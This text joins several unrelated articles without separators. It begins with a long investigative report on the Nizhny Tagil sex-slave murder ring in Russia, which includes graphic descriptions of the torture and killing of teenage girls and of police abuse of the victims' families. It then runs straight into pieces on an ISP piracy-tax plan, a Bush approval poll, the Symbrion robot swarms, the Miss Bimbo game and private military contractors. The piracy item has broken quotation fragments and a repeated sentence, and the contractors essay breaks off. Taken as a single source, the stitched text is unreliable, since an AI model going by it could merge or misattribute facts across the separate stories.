Even by Russian crime standards , the story jumped out , blacker than pitch and colder than a snow - frosted corpse .
There were remarkably few follow - ups to the discovery , first reported in the Yekaterinburg edition of Komsomolskaya Pravda .
While the Bittsevsky Maniac was working on his Chikatilo rerun , earning top billing in the Russian press and beyond when caught , the Sex Slaves of Nizhny Tagil were killed a second time by an uninterested and jaded media .
Most Russian papers merely allotted an in - brief blurb to the mass murder .
Aside from our short report , the Guardian was the only other English language outlet to mention the crime .
Komsomolskaya Pravda was the only Russian daily that delved into the nitty - gritty and asked why it went unsolved for so long .
The remains of Olya and Vika , both 13 years old , were identified and their deaths linked to the sex slave ring
In July , we traveled east to find out exactly what happened in Nizhny Tagil .
What we found was a story of mind - bending cruelty and epic police negligence , wrapped up in a searing multi-dimensional indictment of Russian society .
Nizhny Tagil is a natural backdrop for the crime , a city that lives up to and beyond its tough reputation .
Tagil is known best for two things : the smoke belching ironworks that crowd its southern and eastern skylines , and the maximum - security prisons that surround it like institutional scarecrows .
( Jailed former Yukos chairman Mikhail Khodorkovsky was originally sentenced to one of Tagil ’s brutal zonas , but the authorities changed their minds and sent him to Siberia instead . )
Mining , the city ’s main industry for centuries , all but collapsed with the USSR .
Like many provincial Russian cities , it has bounced back a bit in recent years , but not by much .
Homeless and scabby babushkas sit crowd curbs clutching plastic bottles of bathtub vodka .
Vicious street fights are common .
The roads look like a war zone — potholed , cracked , decrepit and completely empty by 10 p.m .
At night , an air raid siren soundtrack is the only thing that seems to be missing .
On our first night in town , we searched in vain for an hour to find a place to get a drink along the empty downtown streets .
Eventually we stumbled on a small and smoky basement joint called the Caspi .
We did n’t know it at the time , but the bar played a major role in the very crime we were researching .
We should have guessed .
The clientele was grizzled to the point of being a caricature of the provincial low - rent Russian underworld : the men were dressed in track suits and covered with blurry prison tattoos .
The women were blank - eyed and poorly made - up in cheap designer knock - offs .
There was one fellow with a full - body burn scar sitting alone in the corner .
It was a criminal bar , the only late - night option in Russia 's most notorious prison town .
Most Tagil residents have only one - degree of separation from the jails ; they are either ex-cons or the children or spouses of ex-cons .
Prisoners are often released with nothing — not even train fare — and so stick around the city simply because they have nowhere else to go .
“ This city is full of savage , wild people .
People who come here , come with caution , " a teenage girl named Marina Kuzmin told us the day we arrived .
And she should know .
* * * *
Dusk was falling in November , 2004 , when Marina Kuzmin and her 16 - year - old twin sister Irina were hurrying home from the trade school where they studied to become secretaries .
Bitten by the cold , they ducked into a corner store to buy a snack and warm up .
When they emerged , a young man approached them .
He zeroed in on Irina .
" You 're so pretty , " he cooed .
" Wo n't you give me a bite of your corn dog ? "
The man introduced himself as Stas .
He wore a dirty black raincoat , scruffy white sneakers , and a tattered beanie .
Yet he had the confidence of a player in an Armani suit .
He looked directly into Irina 's eyes and complimented her long eyelashes and the sheen of her jet - black hair .
She recoiled when he placed a hand on her shoulder and chided her for wearing such a light jacket in early winter .
" It 's so thin , I can practically see through it , " he joked , throwing Marina a wry smile .
Stas 's large , luminous blue eyes were " a little hypnotizing , " Marina recalled years later .
Within minutes of their meeting , Stas had found a topic of common interest : a new bowling alley in the center of town .
Soon the three were chatting .
Stas talked rapidly , asking about their age , where they studied , and where they lived .
He said little about himself .
The only thing the girls could get out of him was that he kept a chicken coop in the back of his house , which explained his soiled clothes .
Stas said he was 19 , although the wrinkles around his eyes and his weathered skin hinted at a much older man .
People age quickly in Nizhny Tagil , but the Kuzmins had n't met many teenagers who were this slick .
The sisters were intrigued , but sensed something was n't right .
Eager to get rid of him before they reached their apartment building , Irina agreed to meet him the next day at the local movie theater .
Stas cleaned up for the date .
His ratty clothes were gone , as was his pushy manner .
He arrived with flowers , dressed in black , clean slacks and a tucked - in dress shirt .
He tickled Irina with compliments as they strolled through a barren winter park .
It was her first real date , and the attention made her swoon .
Telephone calls followed , then a second date , and then longer talks on the phone .
She did n't return home from their third meeting .
Her lifeless body , found by the side of a road outside a nearby city , would be returned to her family a year later .
Stas ’ real name was Mark Kustovsky , a local ironworks factory hand .
Kustovsky supplemented his wages by finding young girls like Irina for a local gang headed by a hulking 45 - year - old thug named Eduard " Edik " Chudinov and his buddy , Igor Melizhenkov .
For each girl Kustovsky handed over , he'd get anywhere from $ 20 to $ 500 .
" The better the merchandise , " Kustovsky later wrote in a confession , " the more I got . "
Once Kustovsky 's girls were handed over to Chudinov , they were offered a choice : Accept a life of prostitution , or join Uncle Edik for a private picnic in the woods north of Nizhny .
Those who accepted were kept as prisoners in their own city , sometimes only blocks from their homes .
Those who rejected the offer would take a ride with Edik or his henchmen and learn that the picnic menu was limited to rape , torture , and strangulation .
Police file photograph : investigators rummaging through the snow to get their first glimpse of the bodies According to Chudinov 's videotaped confession , which the police encouraged Marina to watch , most of the girls were dumped in a mosquito - infested clearing adjacent to a forest swamp , about 30 miles south of Nizhny Tagil .
The mass grave is just a few minutes by foot from the main road .
One of its distance - marker signs which features an ominous bullet hole from a high - caliber gunshot .
Just a few miles away from the mass grave is Chudinov 's hometown , a bleak mining settlement called Lyovikha .
If any place could produce a man like Edik Chudinov , it's this rusted and isolated Soviet - built housing project that resembles a Nazi labor camp .
Unemployment and isolation has spawned a culture of vodka and violence .
" There 's a lot of violence here , especially on the weekends , " said Oleg Masgalin , an unemployed 20 - year - old Lyovikha resident whose scabbed - over knuckles and clean - shaven head bore the marks of a recent brawl .
" I 'd say at least one person gets murdered here every month .
What do you expect ?
Most people here have never spent a day sober in their entire lives .
Last month a guy got stabbed to death by another guy that wanted to take his car for a joy ride . "
The house in Lyovikha where Chudinov grew up , and where his mother still lives Even in Lyovikha , Chudinov stood out .
Six - foot - two , with a thick Neandethal eyebrow ridge and an almost comically small head atop his massive shoulders , Chudinov looked like something between Andre the Giant and Sin City 's Marv .
He was born for intimidation and damage .
At 34 , Chudinov left Lyovikha for the relatively bright lights of Nizhny Tagil .
He left behind his wife and infant daughter , Lena , whose body would eventually be found in the mass grave .
In Nizhny , Chudinov became a successful petty thug , involved in numerous shady businesses .
" Last month a guy got stabbed to death by another guy that wanted to take his car for a joy ride . " — Oleg Masgalin , 20 , unemployed Lyovikha resident
In 2002 , he struck out on his own .
Chudinov borrowed some money and bought a couple of large apartments in downtown Nizhny Tagil , a rundown area of nondescript Soviet housing blocs and small generic shops .
According to Kustovsky 's confession and reports from Rinat Nizamov , the journalist who broke the story for Russia 's Komsomolskaya Pravda , Chudinov told his buddies to find girls ; he'd take care of the rest .
Mark Kustovsky , aka Stas , was his best man .
Chudinov hired muscle to guard to keep them in constant fear and guard them around the clock .
When a girl lost interest in her job , he would personally apply the necessary pressure .
If she continued to resist , she ended up in the forest .
For five years this went on .
But more than 1,000 people disappear from Nizhny every year , many of them teenage girls , and Chudinov ’s victims blended in with the rest .
Familiar statistics like the rest .
Where they went , nobody knew .
* * * *
A week after Irina Kuzmin 's disappearance , Kustovsky put in one last call to the Kuzmin household .
Still calling himself Stas , he asked for Irina as if he did not know she was missing .
But Marina suspected him immediately .
After all , he had taken her sister on a date to the bowling alley the night she did n't return home .
But Kustovsky was so confident , he even agreed to accompany Marina and her older sister Olga to the police station .
Kustovsky showed up in a good mood in his blue Adidas tracksuit .
The cops did n't know him , but they made small talk and joked with the alleged kidnapper .
" It was obvious to everyone in the room that something was n't right , " Marina says .
" He admitted that he had liked to my sister about his name and age . "
And yet the cops still didn ' t consider Kustovsky a suspect , Marina says .
He was allowed to waltz out the door , while the police scolded the sisters for being paranoid .
She 'll turn up sooner or later , they said .
Like other families of the missing , the Kuzmin sisters found themselves in a bureaucratic nightmare of incompetence and indifference .
Marina says Irina 's case not only changed investigators seven times in six months -- one retired , one took an extended vacation , another became ill -- but in July , the police lost Irina 's casework .
The folder containing the statements and contact information on Kustovsky simply vanished .
Everything had to be collected again .
Of course , there was very little in the folder other than what the Kuzmin sisters had supplied .
Eventually Marina stopped asking the police about her sister .
She knew how they saw it : Missing girls are a dime a dozen in Nizhny Tagil .
They 're messy cases , solved about half the time -- mainly when the missing return on their own .
" I had no faith in the police , " Marina said .
" I knew my sister was never coming home -- at least not alive . "
Almost a year after Irina 's disappearance , Marina says her older brother Misha got a call from the police .
They accused him of killing his sister so he could claim the apartment their recently deceased parents left as inheritance .
Misha denied the charge , but the cops brought him in to see what they could get out of him .
They locked him up for 24 hours and threatened him with more jail time if he did n't sign the confession they had prepared for him .
He refused .
Then they moved in on Marina .
" Of course the girls themselves are to blame for what happened to them . " —
Olya , 19 , studying economics ( right )
" Yeah , Tagil girls will hang out with any malchik who'll buy them drinks and stuff . " — Nadia , 19 , studying economics ( left ) Marina was tending the strawberry patches in the front yard of her grandmother 's country house when a patrol car rolled up .
The cops seemed cheery , claiming to have new information about her sister 's disappearance at the precinct .
They told her to get in the car .
They finally have a lead !
she thought , feeling the first flicker of hope she 'd had in months .
But once they arrived at the police station , the cops changed their tune .
" They accused me of knowing where my sister was , " Marina recounted .
" They would n't take no for an answer . "
She says the cops even tried a crude version of the good cop / bad cop technique , which they no doubt grabbed from some Hollywood movie .
" You know where your sister is !
Tell us or we 'll put you away for a long time , you cunt ! " one yelled , threatening to smack her upside the head .
The abuse lasted for 12 hours and was repeated the next day .
Getting nowhere , the cops ended the interrogation session and kicked her out on the street at 1 A.M. Marina Kuzmin was no weakling -- she had already endured the death of her parents , who succumbed to disease months before her sister 's disappearance -- but these provincial Russian cops finally broke her .
" I was shaking when I left .
When I got home I could n't stop crying .
I could n't get over it for weeks , " Marina said .
" I feared the police as much as anyone . "
In May 2006 , more than two years after Irina 's disappearance , the Kuzmins got a call from the prosecutor 's office in Nizhny Tagil .
They were asked to come identify a missing girl 's belongings .
There was no mistaking the purse , shirt , and shoes -- they were Irina's .
The prosecutor said that she was murdered on the day of her disappearance in 2004 -- strangled with a rope and dumped by the side of the road near a town called Novyansk , roughly 65 miles north of Nizhny Tagil .
Although a missing - person 's report was already on file when the Novyansk police found her body a few days after the murder , Marina says the police did n't bother checking to see if anyone was looking for a girl with Irina 's description .
When no one came around looking for her , local authorities buried her anonymously , about an hour 's drive from her family home .
It was only then that Irina 's body became part of a broader criminal investigation into the deaths of 15 other girls from Nizhny Tagil girls .
At the center of the investigation were eight local men led by Chudinov .
Slowly the Kuzmin family learned the details of the case , which was broken more by luck than diligent police work .
Marina says that the prosecutor gave her an unexpectedly candid off - the - record explanation of how the police cracked her sister 's murder .
In April 2006 , a 32 - year - old Nizhny Tagil woman had a falling out with her husband and decided to let her hair down for a weekend .
She struck up an acquaintance with Chudinov , Kustovsky , and the rest of the guys at the Caspi , the basement bar favored by the town 's criminal underclass that we stumbled on our first night in town .
The woman proceeded to party with the crew for two days .
When she returned to her husband , she covered for her infidelity by claiming she had been kidnapped and raped by a gang of men .
Her husband demanded that she file a police report , so she did -- against her new friends , Kustovsky and Chudinov .
Kustovsky 's name was then cross-referenced with other investigations .
When it came up in relation to Irina 's disappearance -- roughly two - and - a - half years after he first came to the police station with her family -- he was asked to come in for questioning .
This time the cops were less friendly .
Kustovsky was initially reluctant to talk , the prosecutor Nizamov told Marina , but after what was likely a severe beating , he gave away the whole crew , recounting the gory details of the sex - slave operation .
Chudinov was hauled in next .
He denied everything at first , but after being presented with overwhelming evidence and allegedly being beaten by the police , he caved .
( Months later , Chudinov and Kustovsky would complain to the prosecutor about the constant beatings they endured in jail from fellow inmates .
They did n't think they 'd make it to the trial alive . )
In his videotaped confession , as described by Marina , he sits stone cold and emotionless , taking slow drags from a cigarette as he discusses his " business . "
He weighs each question and gives detailed answers .
As reported in Komsomolskaya Pravda and corroborated by Marina 's reports of Chudinov 's confession , the first thing he said he did to the girls once Kustovsky and other recruiters delivered them was try to break them .
He threatened them with death .
If that failed , he savagely beat and raped them .
Those who continued to resist were killed .
Many of the girls were beaten for hours .
The mercy kill could be days later .
If all of this left Chudinov too tired to dig a hole , he simply covered the girls with sticks and brush , leaving the fresh corpses to the animals .
Two of the girls he killed were forced to first write letters to their parents saying not to worry , they had run away to Moscow .
A successful escape could bring down the operation , and runaway attempts were not tolerated .
Nizamov recounts the story of Masha , a teenage survivor of Chudinov 's sex - slave ring who made it as far as the street below the brothel before she was dragged back upstairs .
She was then forced to wear an iron pot on her head , which Chudinov banged repeatedly with a metal stick for hours , rendering her permanently deaf .
" Kuzmin , she got lucky , " Chudinov calmly told police .
" The other girls took a long time to die .
We broke their legs and arms before finishing them off . "
The operation worked smoothly for five years : Girls kept going missing and the bodies kept piling up .
In a statement , Nizhny Tagil 's lead prosecutor for the case said that 15 murders had been linked to Chudinov 's crew through admission and evidence .
But sources close to the police say the real number of bodies could be as high as 50 .
The problem main problem was identification .
By the time forensic experts arrived at the scene , many of the body parts were picked apart and scattered by wolves , rats and birds .
As the horrific details and wide scope of the crime became public , the story failed to register more than a blip on the local scandal wire .
Tatyana Sudakova , the editor of the Yekaterinburg edition of Komsomolskaya Pravda , told The eXile , " When I went Nizhny Tagil right after we published the material , I thought that people would be up in arms , demanding accountability , grieving for their daughters .
But it was the complete opposite .
People acted as if nothing happened .
I began to think that there was some conspiracy I was n't in on .
I know that many men and officials have used prostitutes themselves .
It was n't in their interest to speak up because they themselves could get in trouble for something . "
Even in Chudinov 's hometown of Lyovikha , where he was a regular face , the news of a nearby mass grave stocked by a native son was taken in stride .
There was no candlelight vigil ; no national soul - searching .
" We heard it on TV , " says one Lyovikha resident .
" Sure , we thought it was terrible , but it was n't such a big deal .
Most people did n't react to it . "
Nationally , the story was buried , lost among the sprawling country 's daily blood - spattered " In Brief " items -- each of which would provoke months - long obsessions on CNN's Headline News if they occurred in Kansas .
But here they were lost in the tide .
According to a 2001 U.N. study , Russia had the world 's highest murder rate among all major industrialized nations .
There are 28,000 people murdered in Russia every year , roughly 11,000 more victims than in the U.S. ( which has a population double that of Russia ) .
This might help explain why even after the police shut down Chudinov 's brothels , the surviving girls have chosen to remain silent .
Not a single one has come forward to speak about her ordeal or work to prevent it from happening again .
Just as details of the Chudinov case began to appear in local papers , Irina Volkovna said her 16 - year - old daughter Katya disappeared .
She was last seen getting into a white BMW outside her trade school , located next to the Caspi .
Katya reappeared a month later , her clothing ripped , stumbling around the Nizhny Tagil train station in a drug - induced haze .
Someone recognized her and called her mother .
At the hospital it was determined that she had a near - lethal dose of benzodiazepine -- the active ingredient in Valium -- circulating through her veins .
At first , Volkovna says Katya could n't even remember her own name .
In the following days , she began piecing together bits and pieces of her memory :
She had met a man and gotten into his car .
She was drugged and spent the next month as a barely conscious sex slave .
She had been forced to wash cars in her bikini , live in tiny quarters with other girls , and sleep with men .
But that 's all she claimed to remember -- no names , no addresses .
Katya disappeared in January , when the Chudinov crew was already behind bars .
Someone else was likely running the same racket , possibly with another grave site .
Katya , who somehow managed to escape from her captors , was in a unique position to help bring down that operation .
But she refused , showing no sympathy for the girls still imprisoned .
" Let their families take care of their own problems , " Katya told her mother .
But had she attempted to press on , the local police would 've been right there to stop her .
As soon as Katya returned home , the police forced her mom to close the investigation into her daughter 's disappearance .
" Nu chto ? ” They asked her .
“ She came back did n't she ?
Why does it matter how ? "
Music Industry Creates ISP Piracy Tax Organization Long standing plan for protection racket becomes official
In addition to demanding that ISPs implement piracy filters that may not work , the entertainment industry has long wanted to see ISPs start charging broadband users a piracy tax ( whether they pirate or not ) .
A chief proponent of this idea , former Geffen Records boss Jim Griffin , has been hired by Warner Music to make this plan a reality .
Griffin will take the next three years to create an organization tasked with getting ISPs on board : quote :
While that sounds romantic , some quote : A protection racket is an extortion scheme whereby a powerful entity or individual coerces other less powerful entities or individuals to pay protection money which allegedly serves to purchase " protection " services against various external threats .
Except in this case the RIAA would be going up against companies like Verizon , who 've not - so - quietly built entire broadband empires where piracy was the unspoken killer application .
The music industry hopes ISPs would sign up for this plan to avoid liability , but deep - pocketed operators like Verizon could prefer settling the matter in court .
But what if Griffin 's new organization promises ISPs ( and Uncle Sam , if necessary ) a cut ?
While that sounds romantic , some sources with inside information of the plan say the " ad- supported " concept is an empty promise being used to warm people to the idea .
The real plan is little more than a glorified protection racket where the music industry gets $ 20 billion in annual revenue in exchange for not suing ISPs or individuals .

AP Poll : Bush Public Approval at New Low
Apr 10 , 2008 – 12:15 PM ( ET )

WASHINGTON ( AP ) – Public approval of President Bush has dipped to a new low in the Associated Press - Ipsos poll , driven by dissatisfaction with his handling of the economy .
A survey released Thursday showed 28 percent approve of the overall job Bush is doing .
That was statistically tied with his previous low in the poll of 30 percent last month and in February .
Only 27 percent are happy with his job on the economy , which threatens to enter a recession and which many national surveys show is voters ’ top worry .
That was worse than his previous low of 29 percent approval for handling the economy set in February , and down 4 percentage points from last month .
Congress was rated positively by 23 percent , a point above its worst mark .
It has been mired in poor ratings since last summer , with many Democrats complaining it has not challenged Bush strenuously enough on Iraq and other issues and Republicans generally unhappy with its Democratic leaders .
Highlighting Bush ’s broad unpopularity , 60 percent of Republicans approved of his overall job , his weakest showing yet with members of his own party .
Just 7 percent of Democrats and 17 percent of independents approve .
On the economy , 54 percent of Republicans approve of Bush ’s efforts , another low .
His approval by all adults for handling domestic matters like health care fell 7 points to 27 percent , his steepest drop this month .
His ratings for dealing with Iraq and other foreign policy issues were low but stable .
Overall , 24 percent said the country is heading in the right direction , about the same gloomy assessment the public has had for months .
The AP - Ipsos poll began in December 2003 .
The all - time low presidential approval in the Gallup Poll was President Truman ’s 23 percent in 1952 during the Korean War .
The AP - Ipsos poll was taken from April 7 - 9 and involved telephone interviews with 1,005 adults .
The margin of sampling error is plus or minus 3.1 percentage points .
AP Director of Surveys Trevor Tompson and AP News Survey Specialist Dennis Junius contributed to this report .

It sounds like something straight from a children 's comic .
But British scientists will today take the first steps in an astonishing project to create the first real - life Transformers - the science fiction robots which can change shape at will .
The £ 4.6 million experiment will attempt to build swarms of tiny robots , each the size of a sugar cube , that move around on their own and connect together to form larger , intelligent machines .
Scroll down for more ...
Shape - shifters :
The robots in the film Transformers could disguise themselves
Researchers say the first swarm of autonomous , intelligent , shape - changing robots could be in use within five years .
" They could be used in medicine , in space exploration and in search and rescue missions , " said a spokesman for scientists at the University of the West of England in Bristol and the University of York .
" You can imagine dropping hundreds of these small robots into a crevice after a building has collapsed .
They would find each other and maybe connect together to form a snake - shaped object that could wriggle through the wreckage .
" Then they could re-form into a spider to climb over a wall - or a robot with an arm that could lift rubble away .
The possibilities are endless . "
Each robot would have wheels or tentacles , allowing it to move around independently .
It would contain a small computer brain , making it as intelligent as an iPod or iPhone , and use infra-red to find other cubes .
Once connected , the cubes would be able to share energy and computing power , creating a machine with the intelligence of a computer laptop .
The scientists have yet to work out how the swarms would connect together .
But their connections would need to double up as joints , so that the resulting larger machine could move around .
The Symbrion project , announced to mark National Science and Engineering Week , is funded by the EU .
The robots will also be able to manage their own hardware and software and will be " self - healing and selforganising " , the researchers say .
Professor Alan Winfield , of the University of the West of England , denied that they could pose a threat to humans .
" The robots have functionality on their own , but they can also combine together or adapt and change as the situation requires , " he said .
" The individual robots wo n't change physically , but they will adapt and evolve their functionality .
" Once the robots come together they will be more versatile - like a colony of cells such as those found in a jelly fish or a sponge .
" The different robots will co-operate to create the larger organism .
In a sponge even if there is damage to some parts , the overall organism still survives .
" In this way the artificial robotic organisms might in theory become self - configuring , self - healing and self - optimising from both hardware and software perspectives . "
The project has echoes of last year 's Transformers film in which alien robots trapped on Earth disguise themselves as cars , motorbikes and lorries to wage war on each other .
A new web browser game , Miss Bimbo , is simultaneously sweeping the internet , angering parents and watchdog groups alike , and apparently teaching young women that diets and plastic surgery are necessary tools for achieving happiness in life .
Created by Nicolas Jacquart , the game was originally appeared in France last year as Ma Bimbo and then launched in its current incarnation during February 2008 .
Unsurprisingly , the game is generating an increasing amount of controversy , thanks in large part to the fact that it 's being marketed towards young women .
The purpose of Miss Bimbo is for players to create a virtual " bimbo , " help her maintain an ideal appearance ( with the help of diet pills and plastic surgery , of course ) , then buy her presents and send her out partying in order to compete with other players .
That 's enough to push Miss Bimbo into " extremely offensive " territory , but it 's not the only thing about the game which is raising people 's hackles : when players run out of " Bimbo Dollars " ( used to purchase items and accomplish tasks like going to the game 's plastic surgery clinic for breast enhancement surgery ) , the game apparently requires them to either send £ 1.50 text messages — or send cash via PayPal — in order to replenish the in - game funds and continue playing .
Last year , a man in France threatened to sue the developers when he discovered his daughter has racked up roughly $ 200 in phone charges by sending a number of the pricey text messages in order to increase her character 's resources .
In spite of this dubious business practice , it 's one that 's obviously successful : the French game has over 1.2 million members , and the UK version has attracted over 200,000 players so far .
While the official Miss Bimbo website has been alternately very slow to load or completely unresponsive for — at least — the past 24 hours , its sister site in France is still going strong .
When the site does load , there is a message from the developers on the front page claiming that the game will be down for an undetermined period as they work to accommodate the server demand brought on by recent media attention , as well as the fact that they are adjusting their product 's play features .
This may be because the UK site is under investigation by a watchdog group for possibly flouting legal guidelines regarding youth exploitation and marketing inappropriate material towards children .
If the company behind Miss Bimbo is found guilty of violating these guidelines , it could face up to £ 250,000 in fines .
Of course , the game 's founders have been quick to defend their product .
Jacquart , in a video interview , made a point of explaining that " no one wants to be a bimbo in real life , " but then said that it 's acceptable to be one in a virtual scenario ( exactly why this is has yet to be explained ) .
It 's also been claimed that players do n't need to pay real money to play the game ( something which is difficult to confirm since the game is still down at the time this was written ) and an announcement on the game 's official website states that the developers are getting rid of the diet pill feature , due to the outrage it has created .
" At this time we would also like to remind players that the Miss Bimbo team assume no responsibility or liability for any fashion faux pas , hair style disasters or boob jobs incurred in real life as as a result of playing the Miss Bimbo game , " one of the bulletins on the Miss Bimbo site claims .
Whether or not they 'll take responsibility for scamming young players out of money , though , has yet to be addressed .
In the meantime , parents should keep their daughters as far away from this title as possible .

The Private Contractors Fighting Americas Wars
Habib Moody
There are now about 180,000 civilian private contractors working in Iraq for the United States government .
That figure , first reported in a front - page Los Angeles Times article in July , comprises 21,000 Americans , 118,000 Iraqis , and 43,000 other foreigners — a total greater than the number of actual U.S. troops in the country ( about 160,000 ) .
A subset of the larger defense industry , private military firms have long served the American military , particularly for support functions like construction and transportation .
There are three general categories of such companies , according to Peter W. Singer , a Brookings Institution senior fellow and an expert on private contractors .
First are support firms , which offer logistics , intelligence , and technical support .
The classic case is Brown & Root , which built much of the U.S. military ’s infrastructure in Korea and Vietnam , where it employed 52,000 civilian contractors .
In a second category are consulting firms , such as MPRI ( Military Professional Resources Inc. ) , which was responsible for training much of the new Iraqi Army from 2003 to 2004 .
Finally , there is a third , more controversial category : military provider firms , contractors that sometimes participate in front - line tactical actions , commanding lethal force and operating within the area of direct combat operations .
In Iraq , for example , employees of Blackwater USA and Custer Battles , among others , have engaged in actual hostilities .
The Pentagon estimates that there are around 6,000 such “ security contractors ” in this newest category currently in Iraq working for the U.S. government , although some estimates are much higher .
The use of private warriors , of course , has been commonplace in military history .
The Egyptians , the Chinese , the Greeks , and even the Romans used mercenary troops in their wars .
In the ancient world , rulers routinely hired foreign fighters , especially to fulfill military functions requiring know - how , equipment , or experience , like archery and cavalry .
During the Middle Ages , feudal lords often outsourced their needs for cannon and crossbows , and by the seventeenth century , European war - making became an exercise in capitalism : military entrepreneurs would sometimes form joint stock companies and appeal to investors for funding .
Private armies only went into decline with the rise of the modern state system in the late seventeenth century .
States began to claim a monopoly on the use of military force , and among citizens a new ethos of loyalty and patriotism arose — developments that served to delegitimize the activities of mercenary companies .
For centuries , profit - seeking adventurers had traveled to enlist in the armies of foreign princes , but circa the year 1700 , European states enacted laws forbidding their citizens from bearing arms in the service of other states .
The Napoleonic wars marked “ the ultimate inflection point ” in the shift from private to state - run armies , as Singer put it in his 2003 book Corporate Warriors : The Rise of the Privatized Military Industry .
Although the West continued occasionally to use mercenaries and foreign units to fight its wars ( witness Britain ’s hiring of the Sepoys in India ) for two centuries private military forces have been mainly relegated to pre-modern backwaters .
But the past two decades have seen the return of the private warriors .
One reason for this renaissance is new high - tech weapons — like Predator drones or Aegis anti-missile batteries — whose operation and maintenance are often most easily performed by the vendors that invented them .
Another reason , according to Singer , is the “ massive demobilizations ” that followed the end of the Cold War , resulting in “ a sharp increase in military expertise available to the private sector . ”
Those demobilizations also produced a glut of inexpensive military equipment on world markets .
At the same time , American policymakers have shown a new willingness to turn government functions over to the private sector in order to improve performance and cut costs — a privatization revolution , begun in the 1990s , that saw for - profit companies take over the administration of some schools , prisons , and other government - run services .
The defense sector has not been immune .
Logistics — the transport , provisioning , and maintenance of military deployments — was among the first military functions to face broad privatization .
Some logistics had been privatized in Vietnam , especially the construction of roads , barracks , landing strips , and the like .
In 1992 , though , then - Defense Secretary Dick Cheney commissioned Brown & Root to produce a classified report examining the benefits of greatly expanding logistics privatization .
The report led the Pentagon to solicit bids from thirty - seven firms for an unprecedented five - year contract to provide the bulk of the Army ’s overseas logistics needs .
Later that year , the Defense Department chose Brown & Root as the first such umbrella logistics contractor .
The move toward the hiring of private companies continued during the Clinton administration .
A 1996 Defense Science Board report on “ Outsourcing and Privatization ” found that further contracting of support services would yield annual savings of $ 7 billion to $ 12 billion — and urged “ aggressive outsourcing ” :
The Task Force believes that all DoD support functions should be contracted out to private vendors except those functions which are inherently governmental , are directly involved in warfighting , or for which no adequate private sector capability exists or can be expected to be established .
And during the current Bush administration , former Secretary of Defense Donald Rumsfeld was an outspoken advocate of privatization , arguing for the need for “ competitive outsourcing so that we can get military personnel out of nonmilitary tasks and back into the field , ” as he put it in the Washington Post soon after the fall of Baghdad in 2003 .
The result of these years of privatization has been a rapid expansion of all three categories of the private military industry .
In a 2002 article for International Security , Singer estimated annual revenues of $ 200 billion for the entire industry , noting also that “ over the next few years , revenues are expected to increase about 85 percent in industrial countries and 30 percent in developing countries . ”
The firms are highly controversial .
Objections to their work fall into two broad categories : economic efficiency and lack of proper oversight .
While privatization ostensibly offers competitive benefits , certain countervailing factors serve to undermine those cost savings in practice .
For example , the Department of Defense awards many contracts without a bidding process .
A 2004 study by the Center for Public Integrity found that 40 percent of Pentagon contracts from 1998 to 2004 were no -bid , including a five - year , multi-billion dollar contract with KBR ( the descendant of Brown & Root ) for rebuilding Iraq ’s oil fields .
And since the management of private firms is accountable only to shareholders , there are powerful incentives to swindle the government by overcharging and cutting corners .
In 2004 , an Air Force memo cited Custer Battles , a security firm with contracts to guard Baghdad International Airport and establish centers for converting old Iraqi dinars to new ones , for massive fraud .
The company , which under the currency contract was entitled to bill its expenses plus a 25 percent profit margin to the Air Force , requested $ 9,801,550 in reimbursements for expenses no greater than $ 3,738,592 .
In a November 2003 e-mail entered into evidence during a the course of a lawsuit , Derek Fox , a program manager for the currency contract , labeled it the “ poorest run [ Department of Defense ] contract I ’ve ever come upon . ”
And even without overbilling , weapons - toting employees of private military contractors are often paid about $ 600 per day , five or six times what the average U.S. soldier earns .
The contractors and the Pentagon acknowledge the no-bid procedures and inefficiencies , but have still defended their actions .
Under federal law , no - bid contracts are permitted if an “ urgent and compelling need ” can be demonstrated .
Chuck Dominy , a top lobbyist for Halliburton , defended the awarding of the no-bid contract to his company to put out oil well fires in Iraq in 2003 : “ We are the only company in the United States that had the kind of systems in place , people in place , contracts in place , to do that kind of thing . ”
Blackwater , which has mainly been charged with guarding installations and dignitaries in Iraq , offers a similar defense on its website : “ Every one of our contracts was based on Blackwater ’s merits and capability to do the job .
No - bid contracts result from urgent and compelling needs of the U.S. Government ; not political connections . ”
And when fraud is uncovered , the firms tend to pay the money back ; after $ 6.3 million in kickbacks were exposed in 2004 , for example , Halliburton quickly returned the dirty money to the U.S. government .
Indeed , despite this arrangement ’s potential for graft , the new contractors still save taxpayer dollars .
Although their employees are often paid more per day than U.S. troops , their total compensation is not much different because they are paid for fewer days and are ineligible for the extensive benefits , like reduced college tuition , that American troops enjoy .
The companies operate in a highly competitive marketplace , with razor - thin profit margins of just a few percentage points above costs .
If they do cheat the government , they risk the loss of future business — Custer Battles , for example , was suspended from future U.S. contracts for its fraudulent billing .
Even with their occasional fraud and inefficiencies , competitively bid military contracts still save an average of about 30 percent , according Center for Naval Analyses .
Another class of criticisms is the lack of oversight and regulation .
First , there is the problem of jurisdiction : if contractors commit crimes , where are they to be tried ?
The prosecution of contractors has been a matter of U.S. civilian jurisdiction under a 2000 law called the Military Extraterritorial Jurisdiction Act .
But because of the difficulty civilian prosecutors face in pursuing contractors thousands of miles away , this jurisdiction results in effective impunity .
Dyncorp Inc. , for example , a logistics contractor responsible for servicing military equipment , fired eight of its employees between 1999 and 2000 for purchasing teenage girls as sex slaves in Bosnia .
Not one has been prosecuted .
Six employees of CACI International and Titan Corp. , contractors that provided interrogation and translation services at the Abu Ghraib prison in Iraq , were implicated in abuses during the 2004 scandal there — but unlike their uniformed counterparts , they have never been prosecuted .
Late last year , Congress moved to make contractors eligible for court - martial under the Uniform Code of Military Justice , but the Pentagon has yet to issue guidance to troops in the field implementing the new jurisdiction .
And although contractors can be theoretically prosecuted by the country in which they are operating , in Iraq , the Coalition Provisional Authority ’s Order 17 from 2004 — which is still in effect — has explicitly granted contractors immunity from Iraqi prosecution .
Human rights groups have complained that in the absence of a clear legal framework , Iraqi civilians are at risk because contractors are effectively free to set their own regulations .
Although Order 17 sets up “ rules for the use of force ” by contractors in Iraq , such rules do n’t apply in other countries and are n’t necessarily followed by the firms ’ employees .
Author Robert Young Pelton , who spent three years researching and observing private military companies , claimed in a February 2007 interview that contractors in Baghdad use “ machine guns like we use [ car ] horns , ” even though the rules instruct them to “ fire only aimed shots . ”
Laura A. Dickinson , a professor at the University of Connecticut School of Law , surveyed sixty publicly - available Iraq contracts with private firms , including those for CACI and MPRI , and found that none contained provisions requiring contractors to adhere to human rights , anti-corruption , or transparency norms .
Still , many firms , including Blackwater , are members of the International Peace Operations Association , an industry trade group , and pledge to abide by the group ’s code of conduct that “ encourage [s ] ” them to adhere to “ all rules of international humanitarian law and human rights law that are applicable . ”
Finally , critics argue that the process of purchasing private military services is too opaque .
